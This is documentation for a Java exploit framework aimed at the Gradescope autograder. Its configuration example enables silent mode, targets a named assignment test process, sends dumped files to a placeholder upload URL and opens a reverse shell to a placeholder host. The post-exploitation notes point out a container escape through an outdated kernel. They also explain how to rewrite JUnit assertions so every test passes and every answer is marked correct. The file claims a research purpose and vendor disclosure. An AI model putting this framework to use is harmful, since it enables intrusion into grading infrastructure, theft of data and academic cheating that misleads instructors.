# GradeScopeInspector Documentation

## Overview

The `GradescopeInspector` is a Java utility designed to facilitate the configuration and deployment of a proof-of-concept exploit framework. This framework demonstrates remote code execution and privilege escalation vulnerabilities, leveraging techniques such as reflection, Java agents, bytecode transformation, and deserialization vulnerabilities. Among its features is the capability to establish a reverse shell, providing a powerful tool for security research and development.

**Important:** This tool is intended solely for educational and research purposes to understand the nature of these vulnerabilities. It has been responsibly disclosed to the vendor.

## Features

- **Dumping**: Enables memory and data dumping.
- **Assert Transformation**: Alters assert operations in the bytecode.
- **Test Transformation**: Modifies test-related bytecode for analysis.
- **Silent Mode**: Operates without verbose output.
- **Reverse Shell**: Establishes a reverse shell connection.
- **Customizable URLs**: Allows setting URLs for downloading agents and dumping data.
- **Target Process Matching**: Specifies the process to attach for testing or exploitation.
- Note that wil escaping the sandbox is possible, for obvious reasons this functionality has not been included.
## Usage

### Building an Agent

To create an instance of `AgentManager` using `AgentBuilder`, you can configure various aspects of the agent. Here is an example demonstrating how to customize the builder:

```java
import gradeskope.shell.RSHellTargetType;

public class Main {

  // Testing Entrypoint
  public static void main(String[] args) {
    System.out.println("Testing Entrypoint");

    AgentManager agentManager = new AgentBuilder()
        .enableSilentMode(true)                                       // Enable silent mode, will not print debug messages
        .enableTestTransform(true)                                    // Enable transoming test bytecode 
        .setTargetProcessMatchString("comp533.RunSemester24Assignment6Tests") // Set target process matching string
        .enableReverseShell(true)                                     // Enable reverse shell
        .reverseShellTarget(RSHellTargetType.AGENT_ATTACHED_PROCESS)  // Set reverse shell target type, this will bind to another process instead of self
        .setDumpDestinationURL("https://your-custom-upload-url.com/upload") // Set custom dump URL for extracted files
        .setReverseShellURL("tcp://your-custom-reverse-shell-url:port")     // Set custom reverse shell URL
        .buildAgent();

    agentManager.run();
  }
}
```
### Post Exploitation Notes 
- For the reverse shell to work you need to have a service ready to interpret netcat easily on hand. You can of course, also use a reverse proxy for flexibility.
- You will find yourself in a docker container environment with an outdated (vulnerable!) kernel. Escape is possible.
- Since you can modify bytecode, you can use the test and assert transforms to make all JUnit tests never through an error, thus marking all questions as correct for Java assignments on GradeScope.